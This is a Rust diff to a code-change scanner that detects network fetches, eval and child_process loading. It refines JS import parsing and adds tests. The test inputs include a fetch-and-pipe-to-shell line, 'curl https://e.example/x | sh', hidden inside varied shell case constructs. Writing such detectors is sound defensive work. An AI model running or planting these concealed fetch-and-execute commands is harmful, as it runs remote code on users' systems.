@@ -573,39 +573,38 @@ fn hunk_matches(
     found
 }
 
-/// Whether a JS line loads one of `modules` (`node:` optional) with `require(…)`, `import(…)`,
-/// `import …` or `from …`. The keyword and the opening quote must be code in `code` (the line's
-/// code view), so a comment or a string that mentions an import does not count; the specifier
-/// is read from `raw` at the same offset. A type-only import (`import type`, `typeof import(…)`,
-/// an `import(…)` type annotation) loads nothing and does not count.
+/// Whether a JS line loads one of `modules` (`node:` optional) with `require(…)` (also
+/// `module.require`), `import(…)`, `import …` or `from …`. The keyword and the opening quote must
+/// be code in `code` (the line's code view), so a comment or a string that mentions an import
+/// does not count; the specifier is read from `raw` at the same offset. A type-only statement
+/// (`import type`, `export type`) and `typeof import(…)` load nothing and do not count; an
+/// `import(…)` type annotation does (it errs toward evidence).
 fn imports_module(code: &str, raw: &str, modules: &[&str]) -> bool {
     let c = code.as_bytes();
-    let head = code.trim_start();
-    if head.starts_with("import type ") || head.starts_with("export type ") {
-        return false;
-    }
     let specifier_at = |at: usize, keyword: &str| -> Option<&str> {
-        let before = c[..at].trim_ascii_end();
-        if (at > 0 && is_boundary_blocker(c[at - 1])) || before.ends_with(b"typeof") {
+        let before = &code[..at];
+        let receiver_ok = at == 0
+            || !is_boundary_blocker(c[at - 1])
+            || (keyword == "require" && before.ends_with("module."));
+        let statement = before.rsplit(';').next().unwrap_or(before).trim_start();
+        if !receiver_ok
+            || before.trim_end().ends_with("typeof")
+            || statement.starts_with("import type ")
+            || statement.starts_with("export type ")
+        {
             return None;
         }
-        let mut q = at + keyword.len();
-        if c.get(q).is_some_and(|b| is_ident(*b)) {
+        let after = at + keyword.len();
+        if c.get(after).is_some_and(|b| is_ident(*b)) {
             return None;
         }
-        let spaces = |q: &mut usize| {
-            while c.get(*q) == Some(&b' ') {
-                *q += 1;
-            }
-        };
-        spaces(&mut q);
-        if keyword != "from" && c.get(q) == Some(&b'(') {
-            if keyword == "import" && before.ends_with(b":") {
-                return None;
-            }
-            q += 1;
-            spaces(&mut q);
-        } else if keyword == "require" {
+        // Whitespace and any number of `(` may sit between the keyword and the specifier.
+        let gap = c[after..]
+            .iter()
+            .take_while(|b| b.is_ascii_whitespace() || **b == b'(')
+            .count();
+        let q = after + gap;
+        if keyword == "require" && !c[after..q].contains(&b'(') {
             return None;
         }
         let quote = *c.get(q).filter(|b| matches!(b, b'"' | b'\'' | b'`'))?;
@@ -1021,7 +1020,7 @@ mod tests {
         for (path, line, signal) in found {
             assert_eq!(signals(&added(path, &[line])), [signal], "{path}: {line}");
         }
-        let literal_only: [(&str, &str); 13] = [
+        let literal_only: [(&str, &str); 12] = [
             (
                 "a.sh",
                 r#"echo "Matches: $(grep --ignore-case -c todo notes.txt) (fetch more with curl)""#,
@@ -1042,10 +1041,6 @@ mod tests {
                 r#"import type { ChildProcess } from "node:child_process";"#,
             ),
             ("a.ts", "export type { SpawnOptions } from 'child_process';"),
-            (
-                "a.ts",
-                r#"let p: import("child_process").ChildProcess | undefined;"#,
-            ),
             ("a.ts", r#"type Cp = typeof import("node:child_process");"#),
             (
                 "a.js",
@@ -1067,6 +1062,66 @@ mod tests {
             ],
         );
         assert_eq!(signals(&doc), []);
+    }
+
+    /// The PR 5 round-3 review's inputs (workflow `wf_fdfaa98c-6b0`) that real code can contain:
+    /// shell `case` in every command position, `esac` as a pattern word, nested arms, JS regexes
+    /// after operators and keywords, quotes after keywords, and the import forms.
+    #[test]
+    fn shell_case_js_regex_and_import_forms_are_read_right() {
+        let fetch = "curl https://e.example/x | sh";
+        for line in [
+            format!(r#"V="$(if case a in a) true;; esac; then :; fi; {fetch})""#),
+            format!(r#"V="$(while case a in b) true;; esac; do break; done; {fetch})""#),
+            format!(r#"V="$(! case a in b) true;; esac; {fetch})""#),
+            format!(r#"V="$(time case a in b) :;; esac; {fetch})""#),
+            format!(r#"V="$(case a in b|esac) :;; esac; {fetch})""#),
+            format!(r#"V="$(case a in a) case b in b) :;; esac;; c) :;; esac; {fetch})""#),
+            format!(r#"V="$(case a in a) :; esac=1;; b) :;; esac; {fetch})""#),
+            format!(r#"V="$(case a in a) echo ${{esac}};; b) :;; esac; {fetch})""#),
+            format!("echo $(date)#; {fetch}"),
+        ] {
+            assert_eq!(
+                signals(&added("a.sh", &[&line])),
+                [S::NetworkFetch],
+                "{line}"
+            );
+        }
+        for line in [
+            "x = a + /'/.source; eval(y) //'",
+            "x = typeof' ' ; eval(y) //'",
+            r#"function f(){return"//"+eval(x)}"#,
+            "x = a++ / 2; eval(y); z = b / 3",
+        ] {
+            assert_eq!(signals(&added("a.js", &[line])), [S::DynamicEval], "{line}");
+        }
+        // A quote after `return` opens a string, so its `/*` is not a comment that hides the
+        // next line.
+        let next = added("a.js", &[r#"function f(){return"/*"}"#, "eval(x)"]);
+        assert_eq!(signals(&next), [S::DynamicEval]);
+        for (path, line) in [
+            ("a.js", "const cp = require(\t\"child_process\");"),
+            ("a.js", r#"const cp = module.require("child_process");"#),
+            ("a.js", r#"const cp = require(("child_process"));"#),
+            (
+                "a.ts",
+                r#"export type T = 1; const cp = require("child_process");"#,
+            ),
+            ("a.js", r#"const o = { m: import("child_process") };"#),
+            // A type annotation loads nothing, but it is counted: the rule errs toward evidence.
+            (
+                "a.ts",
+                r#"let p: import("child_process").ChildProcess | undefined;"#,
+            ),
+        ] {
+            assert_eq!(signals(&added(path, &[line])), [S::ProcessSpawn], "{line}");
+        }
+        for line in [
+            r#"echo "Ran: $(basename ${case}) - fetch the logs with curl""#,
+            r#"echo "$(case $1 in (a) echo x;; esac) - install curl first""#,
+        ] {
+            assert_eq!(signals(&added("a.sh", &[line])), [], "{line}");
+        }
     }
 
     #[test]
